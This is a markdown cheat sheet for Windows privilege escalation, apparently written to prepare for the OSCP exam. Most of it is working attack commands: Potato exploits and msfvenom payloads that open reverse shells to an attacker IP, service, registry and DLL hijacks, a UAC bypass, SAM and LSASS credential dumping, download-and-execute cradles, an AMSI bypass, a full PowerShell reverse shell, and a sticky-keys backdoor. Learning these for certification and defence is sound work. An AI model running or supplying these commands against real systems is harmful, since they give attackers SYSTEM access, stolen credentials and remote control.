# Windows Privilege Escalation

A comprehensive playbook for escalating privileges on Windows hosts during the OSCP. Start at the top, work down. Don't skip steps — easy wins are often missed because someone jumped straight to kernel exploits.

---

## Table of Contents

1. [The Playbook (Order of Operations)](#the-playbook-order-of-operations)
2. [Initial Situational Awareness](#1-initial-situational-awareness)
3. [Automated Enumeration](#2-automated-enumeration)
4. [Manual Enumeration Cheatsheet](#3-manual-enumeration-cheatsheet)
5. [Privilege Abuse (SeImpersonate, SeBackup, etc.)](#4-privilege-abuse--the-most-common-win)
6. [Service Exploitation](#5-service-exploitation)
7. [Registry-Based Escalation](#6-registry-based-escalation)
8. [Scheduled Tasks & Startup](#7-scheduled-tasks--startup-apps)
9. [Stored Credentials](#8-stored-credentials--password-hunting)
10. [DLL Hijacking](#9-dll-hijacking)
11. [Kernel Exploits](#10-kernel-exploits-last-resort)
12. [UAC Bypass](#11-uac-bypass)
13. [Token Impersonation — Potato Family](#12-token-impersonation--the-potato-family)
14. [Useful Privileges Reference Table](#13-useful-privileges-reference-table)
15. [Post-Exploitation Quick Wins](#14-post-exploitation--what-to-grab)
16. [Transfer & Execution Tips](#15-file-transfer--execution-tips)

---

## The Playbook (Order of Operations)

Run this in order. Each step should take ~5 minutes. Don't go deep on any one path until you've completed initial enumeration.

```
[1] Who am I? What can I do?           -> whoami /all, hostname, systeminfo
[2] Run an automated scanner            -> winPEAS / PowerUp / Seatbelt
[3] CHECK PRIVILEGES (whoami /priv)     -> SeImpersonate? SeBackup? -> instant win
[4] Check group memberships             -> Backup Operators? Hyper-V Admins?
[5] Service misconfigurations           -> unquoted paths, weak perms, weak reg
[6] Scheduled tasks running as SYSTEM   -> writable scripts/binaries
[7] AlwaysInstallElevated registry      -> instant SYSTEM via MSI
[8] Stored credentials                  -> unattend.xml, web.config, cmdkey, etc.
[9] Installed software / running procs  -> non-standard? exploitable version?
[10] Kernel exploit (LAST RESORT)       -> match systeminfo to public exploit
```

### Mindset

- **Enumerate, enumerate, enumerate.** 80% of priv esc is finding something the admin left behind.
- **Privileges first.** `whoami /priv` is the single highest-value command on Windows. Always read it.
- **Don't fixate.** If something doesn't work in 15 minutes, move on and come back later.
- **Document everything.** Save output to files so you can diff after running an exploit.

---

## 1. Initial Situational Awareness

The first questions: who am I, where am I, and what is this box?

### Identity & Privileges

```cmd
whoami                          # current user
whoami /all                     # user, groups, privileges, SID — read this carefully
whoami /priv                    # ⭐ MOST IMPORTANT — what privileges do I hold?
whoami /groups                  # group memberships
echo %USERNAME%
echo %USERDOMAIN%\%USERNAME%
```

**What to look for in `whoami /priv`:**
- `SeImpersonatePrivilege` → Potato attacks (instant SYSTEM if on service account)
- `SeAssignPrimaryTokenPrivilege` → Potato attacks
- `SeBackupPrivilege` → read any file (incl. SAM/SYSTEM hives)
- `SeRestorePrivilege` → write any file
- `SeTakeOwnershipPrivilege` → take ownership of any object
- `SeDebugPrivilege` → inject into processes (e.g., dump LSASS)
- `SeLoadDriverPrivilege` → load malicious kernel driver
- `SeManageVolumePrivilege` → potential read access via shadow copies
- `SeTcbPrivilege` → "Act as part of the OS" — game over

Anything **Enabled** is immediately usable. **Disabled** privileges can usually be enabled programmatically if you hold them.

### Host Info

```cmd
hostname
systeminfo                              # OS version, hotfixes, architecture — feed to wesng/sherlock
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn      # installed patches
wmic os get osarchitecture                                  # 32 vs 64-bit
echo %PROCESSOR_ARCHITECTURE%
```

### Users & Groups

```cmd
net user                                # all local users
net user <username>                     # specific user details
net localgroup                          # all local groups
net localgroup administrators           # who's admin?
net accounts                            # password policy
```

### Network

```cmd
ipconfig /all
route print
arp -a
netstat -ano                            # listening ports + PIDs — pivots, internal services
netstat -ano | findstr LISTENING
netsh advfirewall show allprofiles      # firewall state
netsh firewall show state               # legacy
netsh firewall show config
```

### Filesystem Recon

```cmd
wmic logicaldisk get name,description   # drives
dir C:\Users\
dir C:\                                 # non-standard top-level dirs are suspicious
tree C:\Users\ /F /A | more
```

---

## 2. Automated Enumeration

Run **one** of these early. Don't run all three — overlap wastes time. **winPEAS** is the OSCP gold standard.

### winPEAS (preferred)

```cmd
# Drop the binary, then:
winPEASx64.exe                         # full scan, colorized
winPEASx64.exe quiet                   # no banner
winPEASx64.exe systeminfo userinfo     # specific modules

# PowerShell version
powershell -ep bypass
. .\winPEAS.ps1
Invoke-winPEAS
```

**What to focus on in winPEAS output:**
- 🔴 RED / highlighted findings = likely exploitable
- "Interesting Services" — non-Microsoft services
- "Interesting Permissions" — writable service binaries
- "AlwaysInstallElevated" — set to 1 = instant win
- "Credentials" section — saved passwords

### PowerUp (PowerSploit)

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks                       # runs every check
Invoke-AllChecks | Out-File -Encoding ASCII powerup.txt

# Individual checks:
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-UnattendedInstallFile
```

### Seatbelt (.NET, very stealthy output)

```cmd
Seatbelt.exe -group=all                 # everything
Seatbelt.exe -group=user                # user-centric
Seatbelt.exe -group=system              # system-centric
Seatbelt.exe TokenPrivileges            # specific check
```

### Other Tools

```cmd
# JAWS (PowerShell, single-file)
powershell -ep bypass .\jaws-enum.ps1 -OutputFilename jaws-out.txt

# Sherlock — kernel exploit suggester (older but still works)
powershell -ep bypass
Import-Module .\Sherlock.ps1
Find-AllVulns

# Watson — newer kernel suggester
Watson.exe

# wesng (run locally on Kali against systeminfo output)
systeminfo > systeminfo.txt            # on victim
# on attacker:
wes.py systeminfo.txt
wes.py systeminfo.txt --impact "Elevation of Privilege" -i "Local"
```

---

## 3. Manual Enumeration Cheatsheet

When automation isn't an option (AV, no upload, exam jitters).

### Environment

```cmd
set                                     # all env vars — look for paths, creds
echo %PATH%
echo %APPDATA%
echo %LOGONSERVER%
```

### Patches & Hotfixes

```cmd
wmic qfe list brief /format:table
wmic qfe get HotFixID                   # just IDs, easy to diff
```

### Installed Software

```cmd
wmic product get name,version,vendor    # MSI-installed
dir "C:\Program Files"
dir "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s
```

### Running Processes & Services

```cmd
tasklist /svc                           # processes with associated services
tasklist /v                             # verbose, shows user context
wmic process list full
wmic process get name,executablepath,processid

sc query                                # all services
sc query type= service state= all
net start                               # running services
```

### Cross-reference processes to non-standard binaries

```cmd
wmic process get ExecutablePath,Name | findstr /i /v "windows\\system32"
```

---

## 4. Privilege Abuse — The Most Common Win

These are the highest-EV (expected-value) paths on the OSCP. **Check `whoami /priv` first, every time.**

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege → SYSTEM

If you have either of these (very common on IIS, MSSQL, web service accounts), you can almost always get SYSTEM.

**Tool selection by OS:**

| OS | Tool |
|---|---|
| Windows 7 / Server 2008 | Hot Potato |
| Windows 7 → Server 2016 (pre-patch) | Juicy Potato |
| Windows 10 1809+ / Server 2019 | Rogue Potato / PrintSpoofer |
| Windows Server 2019+ | PrintSpoofer, GodPotato |
| Modern (2022+) | GodPotato, EfsPotato |

**PrintSpoofer (cleanest, works on most modern Windows):**

```cmd
PrintSpoofer.exe -i -c cmd                # interactive SYSTEM shell
PrintSpoofer.exe -c "C:\path\nc.exe 10.10.14.5 4444 -e cmd"     # reverse shell
```

**GodPotato (newest, works on .NET 3.5+):**

```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "C:\nc.exe 10.10.14.5 4444 -e cmd.exe"
```

**JuicyPotato (older but iconic — needs CLSID matching the OS):**

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c "{CLSID}"
# CLSIDs: https://ohpe.it/juicy-potato/CLSID/
```

### SeBackupPrivilege → Read Any File (SAM/SYSTEM/NTDS.dit)

```cmd
# Confirm privilege is held
whoami /priv | findstr SeBackup

# Dump SAM and SYSTEM hives
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Exfil and crack offline with secretsdump
# On Kali:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

PowerShell variant using `Backup` flag to bypass ACLs:

```powershell
# Use diskshadow / robocopy /b (backup mode)
robocopy /b C:\Windows\System32\config\ C:\Temp\ SAM SYSTEM
```

On a Domain Controller with SeBackup: dump `NTDS.dit` for all domain hashes.

### SeRestorePrivilege → Write Any File

Pair with SeBackup for full read/write. Common abuse:
- Replace a service binary
- Overwrite a privileged DLL
- Modify `utilman.exe` or `sethc.exe` for sticky-keys backdoor

### SeTakeOwnershipPrivilege

```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant <user>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Then RDP and hit Win+U on login screen → SYSTEM cmd
```

### SeDebugPrivilege

```cmd
# Dump LSASS for credentials
# Using procdump (Sysinternals, often allowed by AV):
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Crack offline with pypykatz:
pypykatz lsa minidump lsass.dmp
```

### SeLoadDriverPrivilege

Load a vulnerable signed driver (e.g., Capcom.sys) and exploit it. Niche, but documented:
- https://github.com/tandasat/ExploitCapcom

### SeManageVolumePrivilege

Grants implicit full access to `C:\` via volume management — can read arbitrary files.

---

## 5. Service Exploitation

Services run as SYSTEM by default. If you can influence what binary or DLL a service loads, you escalate.

### 5a. Unquoted Service Paths

A service path like `C:\Program Files\Vuln App\service.exe` (no quotes, space in path) → Windows tries each token: `C:\Program.exe`, `C:\Program Files\Vuln.exe`, etc.

**Find them:**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Test write access along the path:**

```cmd
icacls "C:\Program Files\Vuln App"
# Look for: (M)odify, (F)ull, (W)rite for your user or BUILTIN\Users / Authenticated Users
```

**Exploit:** drop a malicious EXE named after the truncation point, restart the service.

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Vuln.exe
# Upload to C:\Program Files\
sc start <service>          # or wait for reboot
```

### 5b. Weak Service Permissions

If you can modify a service's config, you can point it at your binary.

```cmd
# Enumerate service ACLs (needs accesschk.exe from Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv <username> *

# Check a specific service
sc qc <service>             # view config
sc sdshow <service>         # security descriptor
```

Look for `SERVICE_CHANGE_CONFIG` (or `SERVICE_ALL_ACCESS`) granted to your user.

**Exploit:**

```cmd
sc config <service> binPath= "C:\Temp\evil.exe"
sc config <service> obj= ".\LocalSystem" password= ""
sc stop <service>
sc start <service>
```

### 5c. Weak Service Binary Permissions

The service config is fine, but you can overwrite the binary itself.

```cmd
# Find the binary
sc qc <service>
# Check ACLs on it
icacls "C:\Path\To\service.exe"
accesschk.exe -quvw "C:\Path\To\service.exe"
```

If you have Write/Modify → replace the binary, restart the service.

### 5d. Weak Service Registry Permissions

```cmd
# Check registry key ACLs for a service
reg query HKLM\SYSTEM\CurrentControlSet\Services\<service>
accesschk.exe -uvwqk HKLM\System\CurrentControlSet\Services\<service>
```

If writable → modify `ImagePath`:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\<service> /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\evil.exe" /f
```

---

## 6. Registry-Based Escalation

### 6a. AlwaysInstallElevated (instant SYSTEM)

If both keys are set to 1, any MSI installed by a normal user runs as SYSTEM.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must return 0x1
```

**Exploit:**

```bash
# On Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi
```

```cmd
# On target:
msiexec /quiet /qn /i C:\Temp\evil.msi
```

### 6b. Autologon Credentials

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for: DefaultUsername, DefaultPassword, AutoAdminLogon
```

### 6c. Autoruns

Anything launching automatically as a privileged user that you can modify = win.

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run

# Check ACLs on the target binaries
icacls "C:\Path\To\autorun.exe"
```

---

## 7. Scheduled Tasks & Startup Apps

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v             # all tasks, verbose
schtasks /query /tn <taskname> /v /fo list

# PowerShell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

**What to check:**
- Tasks running as SYSTEM or Administrator
- Task action points to a script/binary you can write to
- Task triggers on logon or interval

```cmd
# Check ACLs on the target script
icacls "C:\Scripts\backup.ps1"
```

If writable → replace contents → wait for trigger.

### Startup Folder

```cmd
dir "C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

---

## 8. Stored Credentials & Password Hunting

### Files to grep

```cmd
# Unattended install files
dir /s /b C:\unattend.xml C:\unattend.txt C:\sysprep.inf C:\sysprep.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml

# Web configs
findstr /si password *.xml *.ini *.txt *.config 2>nul
findstr /si "password" C:\inetpub\wwwroot\web.config

# IIS application pool creds
%windir%\system32\inetsrv\appcmd.exe list apppool /@t:* /text:processModel.password

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# RDP / saved creds
cmdkey /list                            # stored credentials
# Use them:
runas /savecred /user:DOMAIN\admin "C:\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"

# DPAPI (advanced)
# Look in %APPDATA%\Microsoft\Credentials\ and %APPDATA%\Microsoft\Protect\
```

### Recursive credential search

```cmd
findstr /spin "password" *.* 2>nul
findstr /spin "passwd" *.* 2>nul
findstr /spin /c:"pwd" *.* 2>nul

# PowerShell — much faster and recursive
Get-ChildItem C:\ -Include *.txt,*.xml,*.config,*.ini,*.ps1 -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd" 2>$null
```

### Specific app credential stores

```cmd
# Putty saved sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# WinSCP
# %APPDATA%\Roaming\WinSCP.ini  or  HKCU\Software\Martin Prikryl\WinSCP 2\Sessions

# FileZilla
type "%APPDATA%\FileZilla\recentservers.xml"
type "%APPDATA%\FileZilla\sitemanager.xml"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

# RDP files
dir /s *.rdp
```

### SAM/SYSTEM if reachable

Default locations:
- `C:\Windows\System32\config\SAM`
- `C:\Windows\System32\config\SYSTEM`
- `C:\Windows\Repair\SAM`
- Volume Shadow Copies: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM`

---

## 9. DLL Hijacking

A process loads a DLL by name; Windows searches a defined path order. If you can drop a DLL earlier in the order than the legitimate one, you win.

### Search order (simplified)

1. Directory the EXE was launched from
2. `C:\Windows\System32`
3. `C:\Windows\System` (legacy)
4. `C:\Windows`
5. Current working directory
6. Directories in `%PATH%`

### Find candidates

```cmd
# Use Procmon (Sysinternals) — filter on "NAME NOT FOUND" + "Path ends with .dll"
# Identify a missing DLL in a directory you can write to.

# Or check writable PATH dirs:
$env:PATH -split ";"
# For each: icacls <dir>
```

### Exploit

```bash
# Create a malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o evil.dll
```

Drop it where the process will load it, then restart the process/service.

---

## 10. Kernel Exploits (Last Resort)

Use only after enumeration is exhausted. Kernel exploits can BSOD the box → exam disaster.

### Match systeminfo to an exploit

```cmd
systeminfo > sysinfo.txt
```

On Kali:

```bash
# Windows Exploit Suggester - Next Generation
pip3 install wesng
wes.py sysinfo.txt --impact "Elevation of Privilege" --severity high
wes.py sysinfo.txt -i "Elevation of Privilege" -e          # exploits-only
```

### Common OSCP-Era Kernel Exploits

| CVE | Name | OS | Notes |
|---|---|---|---|
| MS10-015 | KiTrap0D | XP/2003/Vista/7/2008 (x86) | Old gold |
| MS11-046 | AFD.sys | XP/2003/2008 | |
| MS14-058 | Win32k.sys | 2003-2012 | Reliable |
| MS15-051 | Client Copy Image | 2003-2012 | Reliable |
| MS16-032 | Secondary Logon | 7/8/2008/2012 | PowerShell, reliable |
| MS16-135 | Win32k | 7-10/2008-2016 | |
| CVE-2019-1388 | UAC HHCtrl Cert | Win 7-10 / 2008-2019 | GUI cert dialog trick |
| CVE-2020-0796 | SMBGhost | Win 10 1903/1909 | Local LPE variant |
| CVE-2021-36934 | HiveNightmare | Win 10/11 | Readable SAM/SYSTEM as user |
| CVE-2021-1675 / CVE-2021-34527 | PrintNightmare | Most Windows | RCE/LPE via spooler |

Compiled binaries: https://github.com/SecWiki/windows-kernel-exploits

---

## 11. UAC Bypass

If you're an Administrator in a *medium-integrity* shell (UAC enforced), you need to elevate to *high-integrity*.

### Check integrity level

```cmd
whoami /groups | findstr -i "Mandatory"
# Look for: Mandatory Label\High Mandatory Level     = high IL
#           Mandatory Label\Medium Mandatory Level   = need bypass
```

### Bypass techniques

```cmd
# fodhelper (very reliable on Win10)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe" /f
start fodhelper.exe

# CVE-2019-1388 (UAC certificate dialog)
# When a UAC prompt shows for an MS-signed binary, click "Show more details" -> cert -> SpellChecker hyperlink -> SaveAs -> spawn cmd as SYSTEM

# UACMe (huge catalog of methods)
# https://github.com/hfiref0x/UACME
Akagi64.exe <method#> "C:\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"
```

---

## 12. Token Impersonation — The Potato Family

Quick reference for the right potato:

| Tool | Requires | Works On | Notes |
|---|---|---|---|
| **Hot Potato** | NBNS/WPAD | Win 7/2008/2012 | Very old, slow |
| **Rotten Potato** | SeImpersonate | Win 7/8/2008/2012 | DCOM-based |
| **Juicy Potato** | SeImpersonate | up to Win 10 1803 / Server 2016 | Choose CLSID for OS |
| **Rogue Potato** | SeImpersonate | Win 10 1809+ / Server 2019 | Needs redirector or socat |
| **PrintSpoofer** | SeImpersonate + spooler | Win 10 1809+ / Server 2019/2022 | Cleanest |
| **GodPotato** | SeImpersonate | .NET 3.5+, all modern Windows | Most reliable today |
| **EfsPotato / SharpEfsPotato** | SeImpersonate | Most Windows | EFS RPC abuse |
| **DCOMPotato** | SeImpersonate | Various | DCOM service variant |

Decision tree: try **PrintSpoofer** first → if spooler is disabled or patched, try **GodPotato** → fallback to **Juicy** on older boxes.

---

## 13. Useful Privileges Reference Table

| Privilege | Friendly Name | Abuse |
|---|---|---|
| SeAssignPrimaryTokenPrivilege | Replace a process-level token | Potato attacks |
| SeBackupPrivilege | Back up files and directories | Read any file (SAM, NTDS) |
| SeCreateTokenPrivilege | Create a token object | Forge tokens |
| SeDebugPrivilege | Debug programs | Inject into / dump LSASS |
| SeImpersonatePrivilege | Impersonate a client | Potato attacks |
| SeLoadDriverPrivilege | Load and unload device drivers | Load malicious driver |
| SeRestorePrivilege | Restore files and directories | Write any file |
| SeTakeOwnershipPrivilege | Take ownership of files/objects | Replace binaries |
| SeTcbPrivilege | Act as part of the operating system | Full SYSTEM |
| SeManageVolumePrivilege | Perform volume maintenance tasks | Implicit C:\ read access |
| SeShutdownPrivilege | Shut down the system | DoS, force reboot trigger |

### Useful Groups (besides Administrators)

| Group | What you get |
|---|---|
| **Backup Operators** | SeBackup + SeRestore → dump SAM |
| **Hyper-V Administrators** | Manage hypervisor, often path to SYSTEM |
| **DNSAdmins** | Load DLL into DNS service running as SYSTEM (`dnscmd /config /serverlevelplugindll`) |
| **Server Operators** | Modify services on DCs |
| **Print Operators** | SeLoadDriver |
| **Event Log Readers** | Read sensitive event logs |
| **Storage Replica Administrators** | File access |
| **Remote Management Users** | WinRM access |

---

## 14. Post-Exploitation — What to Grab

Once you're SYSTEM, before celebrating:

```cmd
# Dump hashes
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Or in-memory:
# (Mimikatz / pypykatz)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Proof file
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\root.txt

# ipconfig for the report
ipconfig /all
```

### Clean up your tracks (real engagements only — NOT on the OSCP report)

For the exam, leave artifacts in place and screenshot them as evidence.

---

## 15. File Transfer & Execution Tips

### Transfer

```cmd
# certutil (built-in)
certutil -urlcache -split -f http://10.10.14.5/winPEASx64.exe winPEAS.exe
certutil -urlcache -split -f http://10.10.14.5/nc.exe nc.exe

# PowerShell download
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\Temp\file.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\Temp\file.exe')"

# SMB
# On Kali:
impacket-smbserver share . -smb2support
# On Windows:
copy \\10.10.14.5\share\winPEAS.exe .
\\10.10.14.5\share\winPEAS.exe              # execute directly

# bitsadmin
bitsadmin /transfer myJob /download /priority normal http://10.10.14.5/file.exe C:\Temp\file.exe
```

### Execution

```cmd
# AV blocking your binary? Try:
# 1. Rename to something benign
# 2. Run from C:\Windows\Tasks\ or C:\Windows\Temp\ (more permissive)
# 3. Use PowerShell with -ep bypass

powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

# AMSI bypass (one-liner, may be flagged)
powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
```

### Quick reverse shell

```bash
# Kali
nc -lvnp 4444
```

```cmd
:: Windows (nc.exe on disk)
nc.exe 10.10.14.5 4444 -e cmd.exe

:: PowerShell one-liner
powershell -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

---

## Final Checklist Before Giving Up

If nothing in this playbook worked, double-check you actually ran:

- [ ] `whoami /priv` AND `whoami /groups` — read every line
- [ ] winPEAS — read the RED findings
- [ ] `wmic qfe` → wesng on Kali
- [ ] `cmdkey /list` and `runas /savecred`
- [ ] `findstr /si password *.xml *.config *.ini` from `C:\`
- [ ] PowerShell history file
- [ ] `accesschk.exe -uwcqv "Authenticated Users" *` for service ACLs
- [ ] `AlwaysInstallElevated` keys
- [ ] Scheduled tasks → writable scripts
- [ ] Unquoted service paths → writable dir along the path
- [ ] Old/non-MS software in `Program Files` → searchsploit it
- [ ] Internal-only ports in `netstat -ano` → pivot/port-forward

If still stuck, reset the box and try the foothold again — you may have missed creds in the initial exploit output.
